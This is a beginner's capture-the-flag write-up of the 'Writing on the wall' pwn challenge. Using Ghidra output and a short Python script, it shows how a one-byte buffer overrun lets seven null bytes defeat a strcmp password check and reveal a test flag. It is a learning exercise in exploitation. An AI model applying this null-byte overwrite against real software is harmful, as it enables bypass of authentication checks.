---------------------------------------------------------------------

title: Cyber Apocalypse 2024: Hacker Royale - Writing on the wall

author: Val

date: "2024-03-15"

category: Pwn

difficulty: very easy

---------------------------------------------------------------------


![htb-banner](htb-banner.svg "HTB")

# Cyber Apocalypse 2024: Hacker Royale - Writing on the wall
<i>
Difficulty: <b>Very Easy</b>

Category: <b>Pwn</b>

This is my first writeup and just hopped in to pwning challenges. I just wanna summarize and share my thoughts on what I have solved from the challenge.</i>

## Test Input

At first, I did some input checks by passing random strings and passed a bunch of A's. But it seems that the program is not vulnerable to buffer overflow. We need to do some digging by checking the file.

<b>1st Attempt:</b>
```console
$ echo "helloworld" | ./writing_on_the_wall

〰③ ╤ ℙ Å ⅀ ₷

The writing on the wall seems unreadable, can you figure it out?

>> helloworld

[-] You activated the alarm! Troops are coming your way, RUN!
```

<b>2nd Attempt:</b>
```console
$ python -c "print('\x41' * 1337)" | ./writing_on_the_wall     

〰③ ╤ ℙ Å ⅀ ₷

The writing on the wall seems unreadable, can you figure it out?

>> 

[-] You activated the alarm! Troops are coming your way, RUN!
```

## File Checks 

I have loaded the file in Ghidra and renamed some variables in the code to see what's happening inside the program. 

```c
undefined8 main(void) {
  int isEqualTo;
  long offset;
  char input [6];
  undefined8 secret;
  long buf;
  
  buf = *(long *)(offset + 0x28);
  secret = 0x2073736170743377; // " ssapt3w"
  read(0,input,7);
  isEqualTo = strcmp(input,(char *)&secret);
  if (isEqualTo == 0) {
    open_door();
  }
  else {
    error("You activated the alarm! Troops are coming your way, RUN!\n");
  }
  if (buf != *(long *)(offset + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```
Upon analyzing the code, it seems like the program accepts 7 characters but the size of the input buffer has only 6. 
This would be impossible for the program to make it equal to the `secret` variable.

So I tried to look if there were some bugs associated with the `strcmp`.

Also as you can see, there's a `__stack_chk_fail()` so there's really no chance of overflowing the stack in this case.

## The `strcmp()` function

After doing some research about `strcmp()`, is it does terminate a null byte if it was passed. So proceeding to my next step, I tried to send a null payload which contains 7 bytes in length.

## Sending the null payload 

A simple script in python that I made.

```python
#!/bin/python

import subprocess
buf = b"\0" * 7 # null payload

print("[*] Sending {}...".format(buf))
subprocess.run(["./writing_on_the_wall"], input=buf)
```

By sending the payload, we got:

```console
$ ./exp.py                          
[*] Sending b'\x00\x00\x00\x00\x00\x00\x00'...
〰③ ╤ ℙ Å ⅀ ₷

The writing on the wall seems unreadable, can you figure it out?

>> You managed to open the door! Here is the password for the next one: HTB{f4k3_fl4g_4_t35t1ng}
```

### Resources:

- https://stackoverflow.com/questions/24353504/whats-wrong-with-strcmp#24353916
- https://www.man7.org/linux/man-pages/man3/strcmp.3.html